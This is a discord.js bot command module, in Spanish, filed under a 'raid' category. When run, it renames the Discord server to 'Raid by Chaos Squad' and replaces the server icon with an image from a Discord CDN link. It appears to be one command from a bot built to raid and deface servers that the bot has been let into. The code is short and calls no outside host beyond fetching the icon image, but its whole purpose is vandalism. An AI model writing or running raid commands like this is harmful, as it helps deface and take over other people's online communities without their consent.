const { MessageEmbed } = require('discord.js')
module.exports = {
    name : 'foto',
    category : 'raid',
    description : 'Cambia el nombre y la foto del servidor',

    run : async(client, message, args) => {
        message.guild.setName("Raid by Chaos Squad");
        message.guild.setIcon("https://cdn.discordapp.com/attachments/829162476566347807/838557549996277760/PicsArt_05-02-08.27.31.jpg");
    }
}